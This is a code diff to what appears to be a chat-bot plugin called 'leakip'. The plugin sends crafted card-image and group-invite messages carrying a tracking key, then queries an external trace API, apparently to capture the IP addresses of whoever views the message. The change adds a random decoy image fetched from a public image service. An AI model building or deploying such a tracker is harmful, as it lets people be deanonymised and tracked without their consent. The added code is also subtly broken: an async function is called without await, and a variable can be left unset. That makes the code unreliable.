@@ -35,7 +35,10 @@ async def get_client():
     key = result['key']
     logger.success("Get Key: "+key)
 
-    msg = cardimage_csrf(key)
+    imgurl = None
+    if config.image == "random":
+        imgurl = random_image()    
+    msg = cardimage_csrf(key, imgurl)
     try:
         await leakip.send(msg)
     except:
@@ -115,8 +118,11 @@ def group_invite_csrf(key):
     return Message(MessageSegment.xml(xml))
 
 
-def cardimage_csrf(key):
-    file = config.image
+def cardimage_csrf(key, imgurl=None):
+    if imgurl != None:
+        file = imgurl
+    else:
+        file = config.image
     source = config.source
 
     k = key + ".jpg"
@@ -144,6 +150,21 @@ async def fetch_trace(k):
     url = api + "/data.php"
     params = {'v': v, 'k': k}
     r = httpx.get(url, params=params)
+    result = r.json()
+    return result
+
+async def random_image():
+    result = await get_dmoe()
+    if result['code']=="200":
+        imgurl = result['imgurl']
+
+    return imgurl
+
+async def get_dmoe():
+    url = "https://www.dmoe.cc/random.php"
+    params = {"return":"json"}
+    r = httpx.get(url, params=params)
+    logger.debug(r.text)
     result = r.json()
     return result
 
